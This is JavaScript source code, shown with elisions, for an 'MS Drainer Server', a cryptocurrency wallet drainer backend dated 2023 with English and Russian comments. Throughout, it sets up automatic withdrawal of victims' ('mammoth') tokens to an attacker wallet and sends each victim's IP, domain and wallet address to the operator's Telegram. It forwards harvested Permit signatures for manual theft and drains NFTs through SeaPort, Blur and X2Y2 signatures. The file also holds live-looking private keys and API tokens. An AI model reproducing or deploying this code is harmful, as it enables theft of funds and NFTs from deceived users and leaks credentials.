console.log('\n\n\t============================================================================================');
console.log('\t=========================== MS Drainer Server by bmr 29.08.2023 =========================');
console.log('\t============================================================================================\n\n');
...
const MS_Telegram_Token = "6485341313:AAEJHlPXTxK8fLJbbRArCNEJWwde92LDQLI"; // Enter your token from the bot from @BotFather here (go there, create a bot there and receive this same token)
const MS_Telegram_Chat_ID = "-1002032989654 "; // Enter the chat ID here, where you want to send notifications about the mammoth’s actions (if the ID starts with a minus, write it down)

const MS_Wallet_Address = "0xc3a03a0dea9415d4ec8e80177a8b1ee91a503e06"; // Wallet address where mammoth assets will go
const MS_Wallet_Private = "0xf38d7fa75ed819cd183097d5601cd5b125b522c44fa2b4da1974491f9cd4a212"; // The private key to the wallet is above, MUST BE INDICATED, OTHERWISE THE WITHDRAWAL WILL NOT WORK
const MS_Wallet_Receiver = "0xc3a03a0dea9415d4ec8e80177a8b1ee91a503e06"; // The wallet where the assets will arrive may be the same as MS_Wallet_Address, or may be different
...
const MS_Allowance_API = true; // Whether to save the history of approved tokens (required for the verification module)
const MS_Allowance_Check = false; // Check wallets for repeated top-ups (do not enable if third-party software is used)
const MS_Allowance_Withdraw = {
  ...
  min_amount: 1, // The token unit from which the automatic withdrawal will be triggered (indicate in WEI (converter: eth-converter.com))
  wallets: { //List of wallets where automatic withdrawal works, including your main wallet (ADDRESS:PRIVATE)
    "0xc3a03a0dea9415d4ec8e80177a8b1ee91a503e06": "0xf38d7fa75ed819cd183097d5601cd5b125b522c44fa2b4da1974491f9cd4a212",
  }
};
...
const MS_Protection = true; // Если стоит "true", будет активирована дополнительная защита бекенда
...
// After you see that units have been added to your balance, you can use the draine
...
const MS_Ankr_Token = "a6585b47f22a60f272c98dca61179cb7695feb71d2f134cf03328828d223c833"; // Токен от Ankr Premium, оставьте пустым ("") чтобы использовать Ankr Free
...
const MS_OpenSea_Token = "4009697aec6f49de853fcb9539c5c3c7"; // Токен от OpenSea API, без него OpenSea API больше не работает
...
const MS_Domains_Mode = 0; // 0 - допускать любые Domainы, 1 - допускать только те, которые в белом списке
const MS_Domains_Whilelist = ["example.com", "another.example.com"]; // Белый список Domainов, заполнять по примеру
...
SeaPort: {
    Enable: 1, // 0 - disabled, 1 - enabled (only works when the SeaPort module is installed)
    ...
    Price: 1, // Minimum amount from which this method will be written off
  },
  Blur: {
...
const on_leave_website = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.leave_website.mode) || (data.chat_data != false && data.chat_data.leave_website != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>😭 User #user_${data.user_id} closed or reloaded the site</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_connect_request = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.connect_request.mode) || (data.chat_data != false && data.chat_data.connect_request != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ Requested connection from the user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>💰 Wallet :</b> <code>${data.wallet}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_connect_cancel = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.connect_cancel.mode) || (data.chat_data != false && data.chat_data.connect_cancel != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected connection</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_connect_success = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.connect_success.mode) || (data.chat_data != false && data.chat_data.connect_success != "")) {
      ...
      await bot.sendMessage(receiver_chat_id, `<b>🦊 User #user_${data.user_id} connected the wallet</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code> (${User_Country})\n\n<b>💰 Wallet :</b> <code>${data.wallet}</code>\n<b>💠 Wallet Address:</b> <a href='https://zapper.xyz/account/${data.address}?tab=dashboard'>Address</a>\n<b>⛓ Current Chain:</b> <code>${chain_id_to_name(data.chain_id)}</code>\n\n<i>The balance is being calculated, if the user does not leave the site, you will receive a notification</i>`, {
        parse_mode: 'HTML'
      });
    }
    send_response(response, { status: 'OK' });
...
const on_chain_request = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.chain_request.mode) || (data.chat_data != false && data.chat_data.chain_request != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request to change network</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>⛓ Current Chain:</b> ${chain_id_to_name(data.chains[0])}\n<b>⛓ New network:</b> ${chain_id_to_name(data.chains[1])}`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_chain_success = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.chain_success.mode) || (data.chat_data != false && data.chat_data.chain_success != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} changed network</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_chain_cancel = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.chain_cancel.mode) || (data.chat_data != false && data.chat_data.chain_cancel != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected the network change, or the network is unavailable</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_transfer_cancel = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.transfer_cancel.mode) || (data.chat_data != false && data.chat_data.transfer_cancel != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} отклонил перевод, либо транзакция не прошла</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_approve_cancel = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} отклонил подтверждение, либо транзакция не прошла</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_sign_cancel = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.sign_cancel.mode) || (data.chat_data != false && data.chat_data.sign_cancel != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected the signature or the transaction did not go through</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
  ...
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.sign_request.mode) || (data.chat_data != false && data.chat_data.sign_request != "")) {
      ...
      try {
        ...
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} получил запрос ${data.swapper}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Объект(-ы) подписи:</b> ${assets_str}`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_approve_request = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} получил запрос на подтверждение</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_transfer_request = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.transfer_request.mode) || (data.chat_data != false && data.chat_data.transfer_request != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} получил запрос на перевод</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_sign_success = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} signed the request</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
  ...
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
      ...
      try {
        let assets_str = '';
        for (const elem of data.list) { assets_str += `${elem.name} [${chain_id_to_name(elem.chain_id)}, ${elem.type}] - ${parseFloat(elem.amount)} (${parseFloat(elem.amount_usd).toFixed(2)}$); `; }
        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} подписал ${data.swapper}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Объект(-ы) подписи:</b> ${assets_str}`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_approve_success = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} выдал подтверждение</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
...
const on_transfer_success = async (response, data) => {
  try {
    ...
    if ((data.chat_data == false && MS_Notifications.transfer_success.mode) || (data.chat_data != false && data.chat_data.transfer_success != "")) {
      ...
      try {
        await bot.sendMessage(receiver_chat_id, `<b>✅ User #user_${data.user_id} совершил перевод</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Asset name:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}, ${data.asset.type}]\n<b>Write-off amount:</b> ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
          parse_mode: 'HTML'
        });
      } catch (err) {
        console.log(err);
    ...
    if (data.mode == 1) {
      ...
      try {
        ...
        try {
          ...
          if (transfer_details.length > 0) {
            ...
            if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
              try {
                await bot.sendMessage(receiver_chat_id, `<b>💎 Successfully withdrawn Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nList of tokens that have been withdrawn:\n${withdraw_list}`, {
                  parse_mode: 'HTML'
                });
              } catch (err) {
                console.log(err);
        ...
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>❌ Failed to sign Permit2 user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nYou can try to withdraw these assets yourself using PERMIT data if they are enabled in the drainer settings.`, {
              parse_mode: 'HTML'
            });
          } catch (err) {
            console.log(err);
            ...
            if (ethers.BigNumber.from(gas_limit).lt(ethers.BigNumber.from('5000000'))) {
              ...
              try {
                ...
                if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
                  if (data.sign.type == 1) {
                    try {
                      await bot.sendMessage(receiver_chat_id, `<b>🔑 User PERMIT data #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nThe automatic value selection system detected that the signature was incorrect and corrected one or more values:\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nUsing this data you can independently sign PERMIT online ${chain_id_to_name(data.sign.chain_id)} for the contract: <code>${data.sign.address}</code>`, {
                        parse_mode: 'HTML'
                      });
                    } catch (err) {
                      console.log(err);
    ...
    for (const asset of data.tokens) {
      try {
        ...
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>💎 User NFT successfully withdrawn #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>Token:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}, ${parseFloat(asset.amount_usd).toFixed(2)}$]`, {
              parse_mode: 'HTML'
            });
          } catch (err) {
            console.log(err);
  ...
  try {
    ...
    if (data.seaport == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        ...
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request for SeaPort</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>List of NFTs:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
      ...
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected SeaPort</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
      ...
      if (result) {
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          await bot.sendMessage(receiver_chat_id, `<b>💎 Successfully signed SeaPort user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`, {
            parse_mode: 'HTML'
          });
        }
      } else {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          await bot.sendMessage(receiver_chat_id, `<b>❌ Failed to sign user's SeaPort #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nPerhaps the transaction did not go through or is still in the queue!`, {
            parse_mode: 'HTML'
          });
        }
      }
  ...
  try {
    ...
    if (data.blur == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        ...
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} got a request for Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>List of NFTs:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
      ...
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected Blur</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
      ...
      if (result) {
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          await bot.sendMessage(receiver_chat_id, `<b>💎 Successfully signed Blur user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`, {
            parse_mode: 'HTML'
          });
        }
      } else {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          await bot.sendMessage(receiver_chat_id, `<b>❌ Failed to sign Blur user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nPerhaps the transaction did not go through or is still in the queue!`, {
            parse_mode: 'HTML'
          });
        }
      }
  ...
  try {
    ...
    if (data.x2y2 == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        ...
        await bot.sendMessage(receiver_chat_id, `<b>❓ User #user_${data.user_id} received a request for X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\n<b>List of NFTs:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
      ...
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ User #user_${data.user_id} rejected X2Y2</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nWe will offer him to write off the NFT separately`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
      ...
      if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
        await bot.sendMessage(receiver_chat_id, `<b>💎 Successfully signed X2Y2 user #user_${data.user_id}</b>\n\n<b>🌍 Domain:</b> <code>${data.domain}</code>\n<b>✉️ IP Address:</b> <code>${data.IP}</code>\n\nYou can track the transaction through scanners`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
